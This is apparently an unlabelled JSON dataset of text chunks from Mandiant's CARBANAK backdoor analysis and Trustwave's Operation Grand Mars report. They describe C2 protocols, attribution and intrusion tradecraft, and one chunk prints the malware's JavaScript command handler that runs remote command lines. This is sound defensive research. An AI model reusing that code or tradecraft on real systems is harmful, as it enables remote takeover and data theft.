        "detection": {},
        "prediction": {}
    },
    {
        "text": "The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This URI is then used in a GET or POST request. The body of the POST request may contain files contained in the cabinet format. A sample GET request is shown in Figure 5.Figure 5: Sample pseudo-HTTP beaconThe pseudo-HTTP protocol uses any proxies discovered by the HTTP proxy monitoring thread or added by the adminka command. The backdoor also searches for proxy configurations to use in the registry at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings and for each profile in the Mozilla Firefox configuration file at %AppData%\\Mozilla\\Firefox\\<ProfileName>\\prefs.js. Custom Binary ProtocolFigure 6 describes the structure of the malware\u2019s custom binary protocol.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If a message is larger than 150 bytes, it is compressed with an unidentified algorithm. If a message is larger than 4096 bytes, it is broken into compressed chunks. This protocol has undergone several changes over the years, each version building upon the previous version in some way.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "These changes were likely introduced to render existing network signatures ineffective and to make signature creation more difficult.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Figure 6: Binary protocol message formatVersion 1In the earliest version of the binary protocol, we have discovered that the message bodies that are stored in the <chunkData> field are simply XORed with the host ID. The initial message is not encrypted and contains the host ID.Version 2Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session. This key is sent in the initial message. Version 3Version 3 adds encryption to the headers.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The first 19 bytes of the message headers (up to the <hdrXORKey2> field) are XORed with a five-byte key that is randomly generated per message and stored in the <hdrXORKey2> field. If the <flag> field of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages. Version 4This version adds a bit more complexity to the header encryption scheme.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A 256-bit AES session key is generated and used to encrypt both message headers and bodies separately. Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm. All subsequent messages are encrypted with AES in CBC mode. The use of public key cryptography makes decryption of the session key infeasible without the C2 server\u2019s private key. The RoundupWe have rounded up 220 samples of the CARBANAK backdoor and compiled a table that highlights some interesting details that we were able to extract. It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind. The MD5 hash is for the original executable file that eventually launches CARBANAK, but the details of each sample were extracted from memory during execution. This data provides us with a unique insight into the operational aspect of CARBANAK and can be downloaded here.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Protocol EvolutionAs described earlier, CARBANAK\u2019s binary protocol has undergone several significant changes over the years.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Figure 7 illustrates a rough timeline of this evolution based on the compile times of samples we have in our collection.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This may not be entirely accurate because our visibility is not complete, but it gives us a general idea as to when the changes occurred.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It has been observed that some builds of this data-stealing backdoor use outdated versions of the protocol. This may suggest multiple groups of operators compiling their own builds of this data-stealing backdoor independently.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Figure 7: Timeline of binary protocol versions*It is likely that we are missing an earlier build that utilized version 3.Build ToolMost of CARBANAK\u2019s strings are encrypted in order to make analysis more difficult.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We have observed that the key and the cipher texts for all the encrypted strings are changed for each sample that we have encountered, even amongst samples with the same compile time.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The RC2 key used for the HTTP protocol has also been observed to change among samples with the same compile time. These observations paired with the use of campaign codes that must be configured denote the likely existence of a build tool. Rapid BuildsDespite the likelihood of a build tool, we have found 57 unique compile times in our sample set, with some of the compile times being quite close in proximity.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For example, on May 20, 2014, two builds were compiled approximately four hours apart and were configured to use the same C2 servers. Again, on July 30, 2015, two builds were compiled approximately 12 hours apart.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "What changes in the code can we see in such short time intervals that would not be present in a build tool?",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This command downloads an executable from the C2 and directly runs it in memory. In another case, one build was programmed to check for the existence of the domain blizko.net in the trusted sites list for Internet Explorer while the other was not. Blizko is an online money transfer service.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We have also seen that different monitoring threads from Table 1 are enabled from build to build. These minor changes suggest that the code is quickly modified and compiled to adapt to the needs of the operator for particular targets.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code. Figure 8 shows some of the relationships that can be observed in our data set. Campaign CodeCompile DateAug7/30/15dec12/8/14julyc7/2/16jun5/9/15june5/25/14june6/7/14junevnc6/20/14juspam7/13/14juupd7/13/14may5/20/14may5/19/15ndjun6/7/16SeP9/12/14spamaug8/1/14spaug8/1/14Figure 8: Campaign code to compile time relationshipsRecent UpdatesRecently, 64 bit variants of the backdoor have been discovered.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We shared details about such variants in a recent blog post. Some of these variants are programmed to sleep until a configured activation date when they will become active.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "HistoryThe \u201cCarbanak Group\u201dMuch of the publicly released reporting surrounding the CARBANAK malware refers to a corresponding \u201cCarbanak Group\u201d, who appears to be behind the malicious activity associated with this data-stealing backdoor. FireEye iSIGHT Intelligence has tracked several separate overarching campaigns employing the CARBANAK tool and other associated backdoors, such as DRIFTPIN (aka Toshliph). With the data available at this time, it is unclear how interconnected these campaigns are \u2013 if they are all directly orchestrated by the same criminal group, or if these campaigns were perpetrated by loosely affiliated actors sharing malware and techniques. FIN7In all Mandiant investigations to date where the CARBANAK backdoor has been discovered, the activity has been attributed to the FIN7 threat group.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "FIN7 has been extremely active against the U.S. restaurant and hospitality industries since mid-2015.FIN7 uses CARBANAK as a post-exploitation tool in later phases of an intrusion to cement their foothold in a network and maintain access, frequently using the video command to monitor users and learn about the victim network, as well as the tunnel command to proxy connections into isolated portions of the victim environment.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads. Finally, FIN7 has leveraged several new techniques that we have not observed in other CARBANAK related activity.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We have covered recent FIN7 activity in previous public blog posts:FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC FilingsFIN7 Evolution and the Phishing LNKTo SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for PersistenceThe FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity. Widespread Bank Targeting Throughout the U.S., Middle East and AsiaProofpoint initially reported on a widespread campaign targeting banks and financial organizations throughout the U.S. and Middle East in early 2016. We identified several additional organizations in these regions, as well as in Southeast Asia and Southwest Asia being targeted by the same attackers.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This cluster of activity persisted from late 2014 into early 2016. Most notably, the infrastructure utilized in this campaign overlapped with LAZIOK, NETWIRE and other malware targeting similar financial entities in these regions.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "ORM, and Toshliph) has been previously associated with CARBANAK in various campaigns. We have seen it deployed in initial spear phishing by FIN7 in the first half of 2016. \u00a0 Also, in late 2015, ESET reported on CARBANAK associated attacks, detailing a spear phishing campaign targeting Russian and Eastern European banks using DRIFTPIN as the malicious payload. Cyphort Labs also revealed that variants of DRIFTPIN associated with this cluster of activity had been deployed via the RIG exploit kit placed on two compromised Ukrainian banks\u2019 websites. FireEye iSIGHT Intelligence observed this wave of spear phishing aimed at a large array of targets, including U.S. financial institutions and companies associated with Bitcoin trading and mining activities.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This cluster of activity continues to be active now to this day, targeting similar entities. Additional details on this latest activity are available on the FireEye iSIGHT Intelligence MySIGHT Portal.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Earlier CARBANAK ActivityIn December 2014, Group-IB and Fox-IT released a report about an organized criminal group using malware called \"Anunak\" that has targeted Eastern European banks, U.S. and European point-of-sale systems and other entities.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Kaspersky released a similar report about the same group under the name \"Carbanak\" in February 2015. The name \u201cCarbanak\u201d was coined by Kaspersky in this report \u2013 the malware authors refer to the backdoor as Anunak. This activity was further linked to the 2014 exploitation of ATMs in Ukraine.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Additionally, some of this early activity shares a similarity with current FIN7 operations \u2013 the use of Power Admin PAExec for lateral movement.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "ConclusionThe details that can be extracted from CARBANAK provide us with a unique insight into the operational details behind this data-stealing malware.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Several inferences can be made when looking at such data in bulk as we discussed above and are summarized as follows:Based upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to modify it or have a close relationship to the developer(s).Some of the operators may be compiling their own builds of the backdoor independently.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Varying campaign codes indicate that independent or loosely affiliated criminal actors are employing CARBANAK in a wide-range of intrusions that target a variety of industries but are especially directed at financial institutions across the globe, as well as the restaurant and hospitality sectors within the U.S. Link to RSS feedPrepare for 2024's cybersecurity landscape.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Mandiant Advantage Platform Platform Overview Breach Analytics for Chronicle Security Validation Attack Surface Management Threat Intelligence Digital Threat Monitoring Managed Defense Solutions Proactive Exposure Management Ransomware Industrial Controls & OT Cyber Risk Management Digital Risk Protection Insider Threats Cyber Security Skills Gap Election Security Government Cyber Security Manufacturing Cyber Threat Visibility Attack Surface Visibility Cyber Preparedness Detection and Response Financial Services Cyber Security Services Services Overview Incident Response Strategic Readiness Cyber Security Transformation Technical Assurance View all Services (48) Expertise on Demand Mandiant Academy Overview Education Formats Upcoming Courses On-Demand Courses Certifications ThreatSpace Cyber Range Free Course Sneak Peaks Resources Resource Center Blog Podcasts  Customer Stories Reports Webinars Insights eBooks Infographics White Papers Datasheets Company About Us Careers Events Media Center Noteholder and Preferred Shareholder Documents Partners Partners Overview Technology Partners Cyber Risk Partners Service Partners Channel Partners Partner Portal Connect with Mandiant Contact Us Report an Incident Customer Support Email Preferences Customer Success Media Inquiries",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "\n\n\nOperation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWhen you visit our website, we and our third-party service providers may use cookies and similar technologies to collect information about you.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This information may be used to measure website usage and performance, optimize user experience, and provide targeted advertisements.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For more information on our use of cookies and tracking technologies please review our Privacy PolicyCookie PreferencesAccept All CookiesDecline All Cookies\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrustwave SpiderLabs Uncovers Critical Cybersecurity Vulnerabilities Exposing Manufacturers to Costly Attacks.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "24 HOUR HOTLINES\n                                    \n\n\n\n\n\n\n                                            AMERICAS\n                                          \n\n+1 855 438 4305\n                                            \n\n\n\n\n                                            EMEA\n                                          \n\n+44 8081687370\n                                            \n\n\n\n\n                                            AUSTRALIA\n                                          \n\n+61 1300901211\n                                            \n\n\n\n\n                                            SINGAPORE\n                                          \n\n+65 68175019\n                                            \n\n\n\n\n\nRecommended Actions\n                                      \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrustwave SpiderLabs Uncovers Critical Cybersecurity Vulnerabilities Exposing Manufacturers to Costly Attacks. Learn More\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRequest a Demo\n                  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRequest a DemoFirst Name*Last Name*Company Name*Business Email*Country*Please SelectUnited StatesUnited KingdomAustraliaGermanyMexicoNew ZealandSingaporeOtherAfghanistan\u00c5land IslandsAlbaniaAlgeriaAmerican SamoaAndorraAngolaAnguillaAntarcticaAntigua and BarbudaArgentinaArmeniaArubaAsia/Pacific RegionAustriaAzerbaijanBahamasBahrainBangladeshBarbadosBelarusBelgiumBelizeBeninBermudaBhutanBoliviaBosnia and HerzegovinaBotswanaBouvet IslandBrazilBritish Indian Ocean TerritoryBritish Virgin IslandsBruneiBulgariaBurkina",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "VerdeCaribbean NetherlandsCayman IslandsCentral African RepublicChadChileChinaChristmas IslandCocos (Keeling) IslandsColombiaComorosCongoCook IslandsCosta RicaCote d'IvoireCroatiaCubaCura\u00e7aoCyprusCzech RepublicDemocratic Republic of the CongoDenmarkDjiboutiDominicaDominican RepublicEast TimorEcuadorEgyptEl SalvadorEquatorial GuineaEritreaEstoniaEthiopiaEuropeFalkland IslandsFaroe IslandsFijiFinlandFranceFrench GuianaFrench PolynesiaFrench Southern and Antarctic LandsGabonGambiaGeorgiaGhanaGibraltarGreeceGreenlandGrenadaGuadeloupeGuamGuatemalaGuernseyGuineaGuinea-BissauGuyanaHaitiHeard Island and McDonald IslandsHondurasHong KongHungaryIcelandIndiaIndonesiaIranIraqIrelandIsle of ManIsraelItalyJamaicaJapanJerseyJordanKazakhstanKenyaKiribatiKosovoKuwaitKyrgyzstanLaosLatviaLebanonLesothoLiberiaLibyaLiechtensteinLithuaniaLuxembourgMacauMacedonia (FYROM)MadagascarMalawiMalaysiaMaldivesMaliMaltaMarshall IslandsMartiniqueMauritaniaMauritiusMayotteMicronesiaMoldovaMonacoMongoliaMontenegroMontserratMoroccoMozambiqueMyanmar (Burma)NamibiaNauruNepalNetherlandsNetherlands AntillesNew CaledoniaNicaraguaNigerNigeriaNiueNorfolk IslandNorth KoreaNorthern Mariana IslandsNorwayOmanPakistanPalauPalestinePanamaPapua New GuineaParaguayPeruPhilippinesPitcairn IslandsPolandPortugalPuerto RicoQatarR\u00e9unionRomaniaRussiaRwandaSaint Barth\u00e9lemySaint HelenaSaint Kitts and NevisSaint LuciaSaint MartinSaint Pierre and MiquelonSaint Vincent and the GrenadinesSamoaSan MarinoSao Tome and PrincipeSaudi ArabiaSenegalSerbiaSeychellesSierra",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "IslandsSomaliaSouth AfricaSouth Georgia and the South Sandwich IslandsSouth KoreaSouth SudanSpainSri LankaSudanSurinameSvalbard and Jan MayenSwazilandSwedenSwitzerlandSyriaTaiwanTajikistanTanzaniaThailandTogoTokelauTongaTrinidad and TobagoTunisiaTurkeyTurkmenistanTurks and Caicos IslandsTuvaluU.S. Virgin IslandsUgandaUkraineUnited Arab EmiratesUnited States Minor Outlying IslandsUruguayUzbekistanVanuatuVatican CityVenezuelaVietnamWallis and FutunaWestern SaharaYemenZambiaZimbabweDeviceI agree to receive other communications from Trustwave. By clicking submit below, you agree to our Terms of Use and Privacy Policy. Additionally, you consent to allow Trustwave to store and process the personal information submitted above to provide you with the content requested.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Researcher\n              \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThe Trustwave SpiderLabs team has been actively tracking a malicious campaign conducted by the well-known Carbanak Cybercrime group for the latter part of 2016 and into 2017.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Carbanak is one of the most prolific organized Russian cybercrime groups and is responsible for the theft of billions of dollars from legitimate economies to the criminal underground.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Malware attributed to this group has been cited in the infamous \"billion dollar bank hack\" of 2015 and the massive Oracle/Micros hack of mid-2016 that led to over a million vulnerable POS servers.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Carbanak malware (Carberp family) was also cited by Homeland Security and the FBI as an Indicator of Compromise for Russian Intelligence Service malicious activity in their most recent report GRIZZLY STEPPE \u2013 Russian Malicious Cyber Activity.\n\n ",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Trustwave has tracked Carbanak activity in the latter half of 2016 and found them to be targeting hospitality and retail victims in Europe and North America, specifically targeting their internal corporate secrets and protected payment card data.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Trustwave published a blog earlier in the year within initial findings but has now released the complete malicious campaign profile in a 45-page Advanced Threat Report.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The blog post below is a summary of the malicious profile we have developed for this actor.\u00a0\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Operation Grand Mars\nDuring September and October of 2016, Trustwave SpiderLabs was simultaneously consulted by several leading organizations from the hospitality sector in Europe and the United States to analyze suspicious and potentially malicious activity on their network including servers, point of sale terminals, and client workstations spread across different properties and locations.\n  The motivation of this operation appears to be financial gain, total control of the infrastructure and collection of bots within the victim organizations.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "During the forensics investigation and analysis, we were given the impression that several activities have been performed by different persons or even different groups of people.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We believe that malicious gangs cooperated in this operation with each group holding their own role and task. It soon became obvious that we are dealing with organized crime responsible for establishing this complex system of network hosts and large number of malicious files in order to perform the attacks against multiple victims.\n  The organizations under attack were first alerted either because their enterprise AV service discovered pieces of potentially malicious software or from suspicious indicators in Windows event logs. Since the victims were different organizations the investigations were held by separate teams within Trustwave but intelligence sharing among the teams proved that several similarities existed among the attacks.\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The common successful entry point within all operations was an email message targeted to victim's public-facing services that contained a Microsoft Word document attachment. Upon opening the attachment multiple malicious files were created or downloaded allowing the attackers to gain some level of access into the victim's infrastructure. In some cases, attackers actually called the victims over the phone, social engineering vector, in order to trick staff into opening the attachment.\n\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Figure 1: Malicious Word documentFigure 2: Encrypted Script from malicious document\n\u00a0\n So the malicious Word document when opened, executes the embedded script and drops the following four files:\n\nFigure 3: Files dropped on execution of embedded VBE script\n\u00a0\nMalicious Scripts\nThe role of each of the four dropped files is visually represented in the following activity diagram:\nFigure 4: File process\n\u00a0\nPastebin Account\nAn additional file \"dttsg.txt\" has the following structure and is split into two sections \"last\" and \"code\" providing another covert channel during this operation.{last: \"abc123\", code: \"ZGltIHh4eA==\"}\nCode from Pastebin\nContents of this file retrieved from a Pastebin account used in the attacks as part of the command control mechanism by the attackers belongs to an individual identified as \"Shtokov\". This is yet another (weak) indication of the involvement of Russian/Eastern European actors in these attacks.\n\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Figure 5: Shtokov Pastebin site used in Command and Control\n\u00a0\nData from section \"last\" is written into registry perhaps to keep track of last executed command and \"code\" which is Base64 encoded used as an argument and allows attackers to execute one of the following commands \"Destroy\", \"GetCompInfo\", \"GetProcList\" and \"RunCMDLine\" as displayed below.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "var cod_data = Base64.decode(cmb_ob.c);     if(cod_data == \"#deleteBot#\"){         destroy();       }else if(cod_data == \"#GetCompInfo#\"){         Log(\"$stdOut$\" + GetComputerInform());}else if(cod_data == \"#GetProcList#\"){         Log(\"$stdOut$\" + GetCompProcess());                                                                        }else if( cod_data.indexOf(\"#RunCMDLine#\") ! == -1){         var cmd_str = split(cod_data,'#RunCMDLine#',2);         Log(\"$stdOut$\" + RunCMDLine(cmd_str[1]));   }else{         var tempname1 = \"LanCradDriver.ini\";         var tempname2 = \"LanCradDriver.vbs\";         var tmpPath = GLBFolderPlus;         var tempath1 = tmpPath + \"\\\\\"+tempname1;         var tempath2 = tmpPath + \"\\\\\"+tempname2;          var f = FSO.OpenTextFile(tempath1,2,false,-1);         f.Write(cod_data);         f.Close();\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Arguments from Pastebin\n\u00a0\nPrivilege escalation\nPrivilege escalation was performed by means of various Pass-the-Hash techniques while persistence was achieved by utilizing scheduled tasks and several of the Operating System's auto-start locations. Ultimately these actions allowed attackers to gain Domain or even Enterprise Admin access and gain network access by using several resources as Command & Control points in Europe and the US.\nFigure 6: Event log showing Pass-the-Hash indicators\n\u00a0\nAn event ID 4624 displayed above showing the usage of a local account performing network logon (Logon Type:3) using a randomized source computer name (Workstation Name: T5NMapiY4kGetJDe) most probably a result of an automated tool.\n Google Docs\nCloud services such as Google Docs and Google Forms were involved allowing attackers to keep track of infected systems, spread malware and perform further malicious activities.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Usage of such services as part of the attack is always beneficial for attackers since most enterprise networks allow access to these and it is almost impossible to blacklist them.\n\n Figure 7: Google forms used for tracking victims\n\u00a0\nMalicious code used in these operations was split among memory resident code, scripting code (PowerShell, JavaScript, VBS), executables (often variants of existing malware) and finally usage of customized versions of toolkits such as Metasploit, PowerSploit and Veil Framework.\n\n Figure 8: Encoded PowerShell commands retrieved from Google Spreadsheet\n\u00a0\nAnunak variant and other signed malware\nWhat seems to be the core tools of these activities is a variant of Anunak, remote backdoor, along with a Visual Basic Script specially crafted with data exfiltration features.\n One other significant finding is that some of the executables were signed using valid certificates from Comodo, a Certification Authority. Based on the analysis of the certificates we believe that the attackers actually used fake identity and purchased these to bypass further security controls potentially in place.\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We called this operation \"Grand Mars\" after the company name that cyber criminals used in one of the digital certificates purchased from Comodo.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Most likely, the name and all Russian details (city, address etc.) used in the certificate details are fake, however, the point that someone actually paid for these is a strong indicator that we are dealing with organized criminal activities.\n This threat report describes what we believe to be a systematic criminal operation of attacks targeting the hospitality sector in Europe and the US, at least at this time. However, the findings suggest that other sectors such as e-commerce and retail are equally at risk and the campaign could just as easily spread to other parts of the world.\n The majority of IP addresses used as Command & Control points were unknown systems located within Europe (UK, France, Sweden etc.) indicating that attackers were trying to bypass network security controls by using seemingly innocuous servers as malicious endpoints.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "During the investigation of this operation we monitored access to these C&C servers and found that the attackers would occasionally change their C&C server and take the previous one off-line. We believe that this alternating use of C&C servers was a purposeful action by attackers in order to remain as stealthy as possible.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This threat report intends to provide an analysis of this operation and document:\n\nOur analysis and findings in a way that describe the nature of malicious activities, the tactics and tradecraft utilized by the attackers, possible motives and the attribution of the threat actors behind these attacks.\n Remediation actions and advice to organizations that have already been targeted by this campaign of attacks or willing to take proactive countermeasures.\n Indicators of Compromise (IOCs) that will benefit organizations seeking to either undertake a compromise assessment on their own (or with the help of a team that specializes in threat hunting and compromise assessments such as Trustwave SpiderLabs), or to proactively put in place detection mechanisms for providing an early warning system if and when the organization is targeted.\n\n However, it must be noted that this threat report does not and is not capable of replacing formal incident response actions and procedures that must be undertaken to mitigate the threat and restore business functions as per the Organizational Incident Response/Disaster Recovery roadmap.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Thanks to Sachin Deodhar and Rodel Mendrez for their contribution to the research described in this post.UPDATE: Here are the SHA1 fingerprints of the two certificates found in this investigation:\n\u200ec1:9c:df:78:e2:34:29:fa:f6:86:bd:f8:ff:dc:f5:ef:0b:9f:14:56aa:a6:e7:dc:9b:df:2d:90:31:c0:ec:b0:32:bc:68:67:77:20:5f:92\n\n\n\n\n\n\n\nLatest SpiderLabs Blogs\n\n\n\nHoneypot Recon: MySQL Malware Infection via User-Defined Functions (UDF)\n",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In the vast world of cybersecurity, as technologies evolve, so do the methods attackers employ to compromise systems.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "One such intriguing method that recently surfaced is MySQL servers, leveraging...\nRead More\n\n\nTrustwave SpiderLabs Report:",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
